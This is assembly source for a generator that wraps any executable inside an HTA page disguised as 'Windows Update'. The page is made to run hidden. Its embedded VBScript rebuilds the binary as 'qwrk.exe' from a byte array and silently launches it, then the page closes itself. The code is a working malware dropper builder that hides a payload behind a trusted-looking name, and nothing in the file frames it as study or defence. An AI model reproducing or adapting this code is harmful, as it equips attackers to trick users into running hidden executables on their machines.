; HTA file generator
; #########################################################################

.data
        szHTAFileName   equ     "qwrk.exe"
        szHTAVbsName    equ     "qfl.vbs"

        szHTACode1      db      '<HTML>',13,10
                        db      '<HEAD>',13,10
                        db      '<TITLE>Windows Update</TITLE>',13,10
                        db      '<HTA:APPLICATION ID="Q" APPLICATIONNAME="Q" BORDER="none" BORDERSTYLE="normal" CAPTION="no" ICON="" CONTEXTMENU="no" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no" SHOWINTASKBAR="no" SINGLEINSTANCE="no" SYSMENU="no" VERSION="1.0" WINDOWSTATE="minimize"/>',13,10
                        db      '<SCRIPT LANGUAGE="VBScript">',13,10
                        db      'MyFile = "',szHTAVbsName,'"',13,10
                        db      'Set FSO = CreateObject("Scripting.FileSystemObject")',13,10
                        db      'Set TSO = FSO.CreateTextFile(MyFile, True)',13,10
                        db      'TSO.write "dim filesys, filetxt, getname, path, textfile, i" & vbcrlf',13,10
                        db      'TSO.write "textfile = ""',szHTAFileName,'""" & vbcrlf',13,10
                        db      'TSO.write "Set filesys = CreateObject(""Scripting.FileSystemObject"")" & vbcrlf',13,10
                        db      'TSO.write "Set filetxt = filesys.CreateTextFile(textfile, True)" & vbcrlf',13,10
                        db      'TSO.write "getname = filesys.GetFileName(path)" & vbcrlf',13,10
                        db      'TSO.write "dim a" & vbcrlf',13,10
                        db      'TSO.write "a=Array(',0

        szHTACode2      db      ')" & vbcrlf',13,10
                        db      'TSO.write "for i=0 to ',0

        szHTACode3      db      '" & vbcrlf',13,10
                        db      'TSO.write "filetxt.Write(chr(a(i)))" & vbcrlf',13,10
                        db      'TSO.write "next" & vbcrlf',13,10
                        db      'TSO.write "filetxt.Close" & vbcrlf',13,10
                        db      'TSO.write "dim z" & vbcrlf',13,10
                        db      'TSO.write "dim zz" & vbcrlf',13,10
                        db      'TSO.write "Const ForReading = 1, ForWriting = 2, ForAppending = 3" & vbcrlf',13,10
                        db      'TSO.write "const RemoteExe = ""',szHTAFileName,'""" & vbcrlf',13,10
                        db      'TSO.write "set zz = wscript.createobject(""wscript.shell"")" & vbcrlf',13,10
                        db      'TSO.write "z = zz.run (""',szHTAFileName,'"")" & vbcrlf',13,10
                        db      'TSO.write "wscript.quit" & vbcrlf',13,10
                        db      'Set TSO = Nothing',13,10
                        db      'Set FSO = Nothing',13,10
                        db      'Dim WshShell',13,10
                        db      'Set WshShell = CreateObject("WScript.Shell")',13,10
                        db      'WshShell.Run "',szHTAVbsName,'", 0, false',13,10
                        db      '</SCRIPT>',13,10
                        db      '<script>window.close()</script>',13,10
                        db      '</HEAD>',13,10
                        db      '</HTML>',0

        szHTAShortFmt   db      "%hu,",0
        szHTAShortFmt2  db      "%hu",0
        szHTAIntFmt     db      "%lu",0

.code

GenHTACode proc hFileIn, hFileOut, dwInLen: DWORD
        LOCAL   NumStr[20]: BYTE
        LOCAL   Temp: BYTE
        LOCAL   dwTemp, len: DWORD

        invoke  lstrlen, offset szHTACode1
        xchg    eax, edx
        invoke  WriteFile, hFileOut, offset szHTACode1, edx, addr dwTemp, NULL

        m2m     len, dwInLen
        .WHILE  len > 0
                invoke  ReadFile, hFileIn, addr Temp, 1, addr dwTemp, NULL
                .IF     len == 1
                        mov     edx, offset szHTAShortFmt2
                .ELSE
                        mov     edx, offset szHTAShortFmt
                .ENDIF
                invoke  wsprintf, addr NumStr, edx, Temp

                invoke  lstrlen, addr NumStr
                xchg    eax, edx
                invoke  WriteFile, hFileOut, addr NumStr, edx, addr dwTemp, NULL
                dec     len
        .ENDW

        invoke  lstrlen, offset szHTACode2
        xchg    eax, edx
        invoke  WriteFile, hFileOut, offset szHTACode2, edx, addr dwTemp, NULL

        dec     dwInLen
        invoke  wsprintf, addr NumStr, offset szHTAIntFmt, dwInLen

        invoke  lstrlen, addr NumStr
        xchg    eax, edx
        invoke  WriteFile, hFileOut, addr NumStr, edx, addr dwTemp, NULL

        invoke  lstrlen, offset szHTACode3
        xchg    eax, edx
        invoke  WriteFile, hFileOut, offset szHTACode3, edx, addr dwTemp, NULL
        ret
GenHTACode endp

CreateHTAFile proc uses ebx InFile, OutFile: DWORD
        LOCAL   hFileIn: DWORD
        LOCAL   hFileOut: DWORD

        xor     ebx, ebx

        invoke  CreateFile, InFile, GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL
        mov     hFileIn, eax
        inc     eax
        jz      @chf_ret

        invoke  CreateFile, OutFile, GENERIC_WRITE or GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL
        mov     hFileOut, eax
        inc     eax
        jz      @chf_ret

        invoke  GetFileSize, hFileIn, NULL
        invoke  GenHTACode, hFileIn, hFileOut, eax

        invoke  CloseHandle, hFileIn
        invoke  CloseHandle, hFileOut

        inc     ebx

@chf_ret:
        mov     eax, ebx
        ret
CreateHTAFile endp
